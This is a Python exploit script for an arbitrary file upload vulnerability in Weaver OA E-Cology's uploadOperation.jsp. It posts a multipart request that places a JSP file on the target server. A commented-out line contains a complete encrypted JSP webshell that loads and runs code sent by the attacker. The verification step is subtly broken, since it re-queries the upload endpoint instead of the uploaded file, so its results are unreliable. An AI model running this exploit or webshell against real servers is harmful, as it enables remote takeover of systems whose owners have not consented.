import requests
import re
import urllib, random, string

def verify(url):
    result = {
        'name': '泛微OA E-Cology uploadOperation.jsp 任意文件上传(2022HVV)',
        'vulnerable': False
     }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = 'test.jsp'
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    # shell = '''<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/page/exportImport/uploadOperation.jsp')
    payload_data = '''------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nContent-Disposition: form-data; name="file"; filename="{0}"\r\nContent-Type: application/octet-stream\r\n\r\n{1}\r\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--'''.format(filename, shell)
    verify_url = urllib.parse.urljoin(url, '/page/exportImport/fileTransfer/' + filename)
    try:
        rep = requests.post(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        verify_rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, rep.text):
            result['vulnerable'] = True
            result['verify'] = verify_url
        return result
    except:
        return result
